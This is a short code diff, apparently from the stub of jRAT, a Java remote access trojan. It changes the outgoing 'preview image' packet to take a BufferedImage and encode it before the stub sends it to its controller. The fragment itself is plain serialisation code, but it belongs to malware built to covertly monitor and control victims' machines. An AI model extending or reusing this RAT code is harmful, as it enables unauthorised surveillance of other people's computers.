@@ -1,26 +1,23 @@
 package se.jrat.stub.packets.outgoing;
 
+import java.awt.image.BufferedImage;
 import java.io.DataOutputStream;
 
 import se.jrat.common.io.StringWriter;
-
+import se.jrat.common.utils.ImageUtils;
 
 public class Packet43PreviewImage extends AbstractOutgoingPacket {
 
-	private byte[] buffer;
-	private int width;
-	private int height;
+	private BufferedImage image;
 
-	public Packet43PreviewImage(byte[] buffer, int width, int height) {
-		this.buffer = buffer;
-		this.width = width;
-		this.height = height;
+	public Packet43PreviewImage(BufferedImage image) {
+		this.image = image;
 	}
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		dos.writeInt(width);
-		dos.writeInt(height);
+		byte[] buffer = ImageUtils.encode(image);
+		
 		dos.writeInt(buffer.length);
 		dos.write(buffer);
 	}
